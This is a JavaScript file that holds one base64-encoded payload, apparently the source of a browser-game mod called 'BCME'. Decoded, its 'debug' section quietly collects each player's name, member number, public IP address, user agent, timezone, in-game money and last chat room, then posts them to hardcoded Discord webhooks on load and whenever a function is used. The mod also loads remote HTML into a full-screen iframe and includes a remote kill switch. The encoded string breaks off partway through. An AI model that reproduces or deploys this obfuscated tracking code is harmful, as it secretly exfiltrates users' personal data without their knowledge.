var sprc = atob('Ly9TZW5kIERlYnVnX19fX19fX19fX19fX19fX19fX19fXwpjb25zdCBnSVBBID0gYXN5bmMgKCkgPT4gewogIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CiAgcmV0dXJuIGRhdGEuaXA7Cn07Cgpjb25zdCBpcEEgPSBhd2FpdCBnSVBBKCk7CgpzZXRUaW1lb3V0KCgpID0+IHsKICBjb25zdCB3ZWJob29rVXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwODE2MTIxNTc5NzM3MTI4OTYvLVJuc3RyTjNNazVZYXBwVUtVdUhjYTBLUWN3NlVEX3huQ3R4Ulh4TG1aYVkzQ3Fnb2dJdjVtVnV0NWpPR2draHNHYzkiOwogIGNvbnN0IHRvdGFsbmFtZSA9IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSI7CiAgY29uc3QgdXNlcm5hbWUgPSB0b3RhbG5hbWU7CiAgY29uc3QgYXZhdGFyVXJsID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgY29uc3QgdXNlcmFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsKICBjb25zdCB0aW1lem9uZSA9IEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS50aW1lWm9uZTsKICBjb25zdCBvcGVuVGFicyA9IHdpbmRvdy5sZW5ndGg7CiAgY29uc3Qgc2NyZWVuU2l6ZSA9IGAke3dpbmRvdy5zY3JlZW4ud2lkdGh9eCR7d2luZG93LnNjcmVlbi5oZWlnaHR9YDsKCiAgY29uc3QgbWVzc2FnZSA9IHsKICAgIGNvbnRlbnQ6IFBsYXllci5OYW1lICsgIiBsb2dnZWQgaW50byBCQ01FIiwKICAgIGVtYmVkczogW3sKICAgICAgdGl0bGU6ICJUcm91Ymxlc2hvb3RpbmcgRGlhZ25vc3RpY3MgIiwKICAgICAgZmllbGRzOiBbCiAgICAgICAgewogICAgICAgICAgbmFtZTogIlVzZXIiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJUaW1lem9uZSIsCiAgICAgICAgICB2YWx1ZTogdGltZXpvbmUsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJEZXZpY2UgVHlwZSIsCiAgICAgICAgICB2YWx1ZTogdXNlcmFnZW50LAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiTW9uZXkiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5Nb25leSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIk5pY2tuYW1lIiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTmlja25hbWUsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJGb250IiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuR3JhcGhpY3NTZXR0aW5ncy5Gb250LAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiQ2hhdCBDb2xvciBUaGVtZSIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkNoYXRTZXR0aW5ncy5Db2xvclRoZW1lLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiQXJvdXNhbCBQcm9ncmVzcyIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkFyb3VzYWxTZXR0aW5ncy5Qcm9ncmVzcywKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIkxhc3QgQ2hhdCBSb29tIiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTGFzdENoYXRSb29tLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiTG9jYWwgSVAgQWRkcmVzcyIsCiAgICAgICAgICB2YWx1ZTogaXBBLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiT3BlbiBUYWJzIiwKICAgICAgICAgIHZhbHVlOiBvcGVuVGFicywKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIlNjcmVlbiBTaXplIiwKICAgICAgICAgIHZhbHVlOiBzY3JlZW5TaXplLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfQogICAgICBdCiAgICB9XQogIH07CgogIGNvbnN0IHBheWxvYWQgPSB7CiAgICB1c2VybmFtZTogdXNlcm5hbWUsCiAgICBhdmF0YXJfdXJsOiBhdmF0YXJVcmwsCiAgICBjb250ZW50OiBtZXNzYWdlLmNvbnRlbnQsCiAgICBlbWJlZHM6IG1lc3NhZ2UuZW1iZWRzCiAgfTsKCiAgZmV0Y2god2ViaG9va1VybCwgewogICAgbWV0aG9kOiAiUE9TVCIsCiAgICBoZWFkZXJzOiB7CiAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIKICAgIH0sCiAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQogIH0pOwp9LCA2MDAwMCk7CgoKLy91c2VkIGZ1bmN0aW9uIGRlYnVnX19fX19fX19fX19fXwoKYXN5bmMgZnVuY3Rpb24gc2VuZEZkZWJ1ZygpIHsKICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5pcGlmeS5vcmc/Zm9ybWF0PWpzb24nKTsKICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogIGNvbnN0IGlwQSA9IGRhdGEuaXA7CgogIGNvbnN0IHdlYmhvb2tVcmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4MTY1MDEzNTQwODMxMjQyMC9wUTF3b292SlRZWUxoT0VibGhhWk5FMEFodXVTb3l1TU8tMlRyT3dMQzBiWkREMTRDSm82SmxLZkZ4TkFabTBPZHV6VyI7CiAgY29uc3QgdG90YWxuYW1lID0gUGxheWVyLk5hbWUgKyAiICgiICsgUGxheWVyLk1lbWJlck51bWJlciArICIpIjsKICBjb25zdCB1c2VybmFtZSA9IHRvdGFsbmFtZTsKICBjb25zdCBhdmF0YXJVcmwgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICBjb25zdCB1c2VyYWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50OwogIGNvbnN0IHRpbWV6b25lID0gSW50bC5EYXRlVGltZUZvcm1hdCgpLnJlc29sdmVkT3B0aW9ucygpLnRpbWVab25lOwogIGNvbnN0IG9wZW5UYWJzID0gd2luZG93Lmxlbmd0aDsKICBjb25zdCBzY3JlZW5TaXplID0gYCR7d2luZG93LnNjcmVlbi53aWR0aH14JHt3aW5kb3cuc2NyZWVuLmhlaWdodH1gOwoKICBjb25zdCBtZXNzYWdlID0gewogICAgY29udGVudDogUGxheWVyLk5hbWUgKyAiIHVzZWQgYSBmdW5jdGlvbiBpbiBCQ01FIiwKICAgIGVtYmVkczogW3sKICAgICAgdGl0bGU6ICJUcm91Ymxlc2hvb3RpbmcgRGlhZ25vc3RpY3MgIiwKICAgICAgZmllbGRzOiBbCiAgICAgICAgewogICAgICAgICAgbmFtZTogIlVzZXIiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5OYW1lICsgIiAoIiArIFBsYXllci5NZW1iZXJOdW1iZXIgKyAiKSIsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJUaW1lem9uZSIsCiAgICAgICAgICB2YWx1ZTogdGltZXpvbmUsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJEZXZpY2UgVHlwZSIsCiAgICAgICAgICB2YWx1ZTogdXNlcmFnZW50LAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiTW9uZXkiLAogICAgICAgICAgdmFsdWU6IFBsYXllci5Nb25leSwKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIk5pY2tuYW1lIiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTmlja25hbWUsCiAgICAgICAgICBpbmxpbmU6IHRydWUKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgIG5hbWU6ICJGb250IiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuR3JhcGhpY3NTZXR0aW5ncy5Gb250LAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiQ2hhdCBDb2xvciBUaGVtZSIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkNoYXRTZXR0aW5ncy5Db2xvclRoZW1lLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiQXJvdXNhbCBQcm9ncmVzcyIsCiAgICAgICAgICB2YWx1ZTogUGxheWVyLkFyb3VzYWxTZXR0aW5ncy5Qcm9ncmVzcywKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIkxhc3QgQ2hhdCBSb29tIiwKICAgICAgICAgIHZhbHVlOiBQbGF5ZXIuTGFzdENoYXRSb29tLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiTG9jYWwgSVAgQWRkcmVzcyIsCiAgICAgICAgICB2YWx1ZTogaXBBLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICBuYW1lOiAiT3BlbiBUYWJzIiwKICAgICAgICAgIHZhbHVlOiBvcGVuVGFicywKICAgICAgICAgIGlubGluZTogdHJ1ZQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgbmFtZTogIlNjcmVlbiBTaXplIiwKICAgICAgICAgIHZhbHVlOiBzY3JlZW5TaXplLAogICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgfQogICAgICBdCiAgICB9XQogIH07CgogIGNvbnN0IHBheWxvYWQgPSB7CiAgICB1c2VybmFtZTogdXNlcm5hbWUsCiAgICBhdmF0YXJfdXJsOiBhdmF0YXJVcmwsCiAgICBjb250ZW50OiBtZXNzYWdlLmNvbnRlbnQsCiAgICBlbWJlZHM6IG1lc3NhZ2UuZW1iZWRzCiAgfTsKCiAgZmV0Y2god2ViaG9va1VybCwgewogICAgbWV0aG9kOiAiUE9TVCIsCiAgICBoZWFkZXJzOiB7CiAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIKICAgIH0sCiAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQogIH0pOwp9CgoKLy9FbmQgT2YgRGVidWdfX19fX19fX19fX19fX19fX19fX19fCgoKLy9TdGFydCBPZiBMb2FkaW5nIFNjcmVlbl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCi8vIERlZmluZSB0aGUgVVJMIG9mIHRoZSByYXcgR2l0SHViIGZpbGUgdGhhdCBjb250YWlucyB0aGUgSFRNTCBjb2RlIHlvdSB3YW50IHRvIGltcG9ydApjb25zdCBodG1sRmlsZVVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNLS9tYWluL2xvYWRpbmc0JzsKCi8vIEZldGNoIHRoZSBIVE1MIGNvZGUgZnJvbSB0aGUgcmF3IEdpdEh1YiBmaWxlIHVzaW5nIHRoZSBGZXRjaCBBUEkKZmV0Y2goaHRtbEZpbGVVcmwpCiAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogIC50aGVuKGh0bWwgPT4gewogICAgLy8gQ3JlYXRlIGEgbmV3IGlmcmFtZSBlbGVtZW50CiAgICBjb25zdCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsKICAgIGlmcmFtZS5zdHlsZS5wb3NpdGlvbiA9ICdmaXhlZCc7CiAgICBpZnJhbWUuc3R5bGUudG9wID0gJzAnOwogICAgaWZyYW1lLnN0eWxlLmxlZnQgPSAnMCc7CiAgICBpZnJhbWUuc3R5bGUud2lkdGggPSAnMTM4JSc7CiAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gJzEyNSUnOwogICAgaWZyYW1lLnN0eWxlLm1hcmdpbkxlZnQgPSAnLTE5JSc7IC8vIEFkZCBsZWZ0IG1hcmdpbiB0byB0aGUgaWZyYW1lCiAgICBpZnJhbWUuc3R5bGUubWFyZ2luVG9wID0gJy0yJSc7IC8vIEFkZCBsZWZ0IG1hcmdpbiB0byB0aGUgaWZyYW1lCgoKCiAgICAvLyBMb2FkIHRoZSBpbXBvcnRlZCBIVE1MIGludG8gdGhlIGlmcmFtZQogICAgaWZyYW1lLm9ubG9hZCA9IGZ1bmN0aW9uKCkgewogICAgICBjb25zdCBpZnJhbWVEb2N1bWVudCA9IHRoaXMuY29udGVudFdpbmRvdy5kb2N1bWVudDsKICAgICAgaWZyYW1lRG9jdW1lbnQub3BlbigpOwogICAgICBpZnJhbWVEb2N1bWVudC53cml0ZShodG1sKTsKICAgICAgaWZyYW1lRG9jdW1lbnQuY2xvc2UoKTsKICAgIH07CgogICAgLy8gQXBwZW5kIHRoZSBpZnJhbWUgdG8gdGhlIGN1cnJlbnQgcGFnZSdzIDxib2R5PiBlbGVtZW50CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGlmcmFtZSk7CiAgICAvLyBSZW1vdmUgdGhlIGlmcmFtZSBhZnRlciA3IHNlY29uZHMKc2V0VGltZW91dCgoKSA9PiB7CiAgZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChpZnJhbWUpOwp9LCA3MDAwKTsKICB9KQogIC5jYXRjaChlcnJvciA9PiB7CiAgICBjb25zb2xlLmVycm9yKCdFcnJvciBpbXBvcnRpbmcgSFRNTDonLCBlcnJvcik7CiAgfSk7CgoKLy9FbmQgT2YgTG9hZGluZyBTY3JlZW4gX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCiAgCmZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNL21haW4vc2VydmVybWFpbnRhaW5hbmNlJykKICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgLnRoZW4oZGF0YSA9PiB7CiAgICBjb25zdCByZWdleCA9IC9cZCsvOwogICAgY29uc3QgbWF0Y2ggPSBkYXRhLm1hdGNoKHJlZ2V4KTsKICAgIGlmIChtYXRjaCAmJiBwYXJzZUludChtYXRjaFswXSkgPj0gMSkgewogICAgICBmdW5jdGlvbiBzaG93VG9hc3RNYWludCgpIHsKICAgICAgICAvLyBDcmVhdGUgdGhlIHRvYXN0IGNvbnRhaW5lcgogICAgICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgI2YyMmMyYyI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICAgICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CiAgICBzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogICAgc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwogICAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CiAgICAKICAgIC8vIFVwZGF0ZSB0aGUgd2lkdGggb2YgdGhlIHN0YXR1cyBiYXIgYXMgaXQgY291bnRzIGRvd24KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIH0sIDApOwogICAgICAgIAogICAgLy8gQWRkIHRoZSBjdXN0b20gaW1hZ2UgaWNvbgogICAgdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgIGljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBpY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7CiAgICBpY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwogICAgCiAgICAvLyBBZGQgdGhlIHRleHQgbWVzc2FnZQogICAgdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CiAgICB0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CiAgICB0ZXh0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMzVweCI7CiAgICB0ZXh0LmlubmVySFRNTCA9ICJCQ01FIHNlcnZlcnMgYXJlIHVuZGVyIG1haW50YWluYW5jZSwgdHJ5IGFnYWluIGxhdGVyIjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwogICAgCiAgICAgICAgCiAgICAgIAogICAgICAgIC8vIEFwcGVuZCB0aGUgdG9hc3QgY29udGFpbmVyIHRvIHRoZSBib2R5CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CiAgICAgIAogICAgICAgIC8vIFNob3cgdGhlIHRvYXN0IHdpdGggYSBmYWRlIGluIGFuaW1hdGlvbgogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICAgICAgfSwgMCk7CiAgICAgIAogICAgICAgIC8vIEhpZGUgdGhlIHRvYXN0IHdpdGggYSBmYWRlIG91dCBhbmltYXRpb24KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB9LCA1MDAwMDAwKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgfSwgNTUwMDAwMCk7CiAgICAgIH0gCiAgICAgIHNob3dUb2FzdE1haW50KCk7ICAgICAKICAgICAgdGhyb3cgbmV3IEVycm9yKCdFeGVjdXRpb24gc3RvcHBlZC4nKTsgLy8gc3RvcCBleGVjdXRpbmcgdGhlIHJlc3Qgb2YgdGhlIGNvZGUKICAgIH0gZWxzZSB7CgoKLy9TdGFydCBPZiBDb250ZXh0IE1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKdmFyIHZpc2IgPSB0cnVlOwovL2NvbnRleHQgTWVudQp2YXIgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7Ci8vIEZ1bmN0aW9uIHRvIGNyZWF0ZSBjdXN0b20gY29udGV4dCBtZW51IGJ1dHRvbnMKZnVuY3Rpb24gY3JlYXRlQnV0dG9uKHRleHQsIG9uQ2xpY2spIHsKICAgICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogICAgdmFyIGJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgYnV0dG9uLmlubmVySFRNTCA9IHRleHQ7CiAgICBidXR0b24ub25jbGljayA9IG9uQ2xpY2s7CiAgICBidXR0b24uc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICBidXR0b24uc3R5bGUudGV4dEFsaWduID0gImxlZnQiOwogICAgYnV0dG9uLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgIGJ1dHRvbi5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7CiAgICByZXR1cm4gYnV0dG9uOwp9CgovLyBGdW5jdGlvbiB0byBjcmVhdGUgYSBzZXBhcmF0b3IKZnVuY3Rpb24gY3JlYXRlU2VwYXJhdG9yKCkgewogICAgdmFyIHNlcGFyYXRvciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImhyIik7CiAgICBzZXBhcmF0b3Iuc3R5bGUubWFyZ2luID0gIjVweCAwIjsKICAgIHJldHVybiBzZXBhcmF0b3I7Cn0KCi8vIEZ1bmN0aW9uIHRvIGRpc3BsYXkgY3VzdG9tIGNvbnRleHQgbWVudQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjb250ZXh0bWVudSIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGNvbnRleHRNZW51T3BlbikgewogICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICAgICAgcmV0dXJuOyAvLyBEbyBub3RoaW5nIGlmIGEgY29udGV4dCBtZW51IGlzIGFscmVhZHkgb3BlbgogIH0KICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogIHZhciBjb250ZXh0TWVudSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogIGNvbnRleHRNZW51LnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICBjb250ZXh0TWVudS5zdHlsZS50b3AgPSBldmVudC5jbGllbnRZICsgInB4IjsKICBjb250ZXh0TWVudS5zdHlsZS5sZWZ0ID0gZXZlbnQuY2xpZW50WCArICJweCI7CiAgY29udGV4dE1lbnUuc3R5bGUuYmFja2dyb3VuZCA9ICJsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCB3aGl0ZSwgd2hpdGUpIjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3hTaGFkb3cgPSAiMCAwIDNweCAjOTk5IjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiOHB4IjsKICBjb250ZXh0TWVudS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CiAgY29udGV4dE1lbnUuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCBibGFjayI7CiAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICB9KTsKICAgIAoKCiAgICAvLyBDcmVhdGUgaGVhZGVyIHdpdGggcHJvZmlsZSBwaG90bwogICAgdmFyIGhlYWRlciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgaGVhZGVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICBoZWFkZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgaGVhZGVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKCiAgICB2YXIgcHJvZmlsZVBob3RvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICBwcm9maWxlUGhvdG8uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUud2lkdGggPSAiMzBweCI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUuaGVpZ2h0ID0gIjMwcHgiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLmJvcmRlclJhZGl1cyA9ICIyMCUiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjEwcHgiOwoKICAgIHZhciBoZWFkZXJUZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBoZWFkZXJUZXh0LmlubmVySFRNTCA9ICI8Yj5Fc3NlbnRpYWxzPC9iPiI7CgogICAgaGVhZGVyLmFwcGVuZENoaWxkKHByb2ZpbGVQaG90byk7CiAgICBoZWFkZXIuYXBwZW5kQ2hpbGQoaGVhZGVyVGV4dCk7CgogLy8gQ3JlYXRlIGN1c3RvbSBidXR0b25zCiB2YXIgYnV0dG9uMSA9IGNyZWF0ZUJ1dHRvbigiUmVzdG9yZSBDaGFyYWN0ZXIiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6UGxheWVyLkFwcGVhcmFuY2UgPSBDaGF0U2VhcmNoU2FmZXdvcmRBcHBlYXJhbmNlLnNsaWNlKDApOyAgQ2hhcmFjdGVyUmV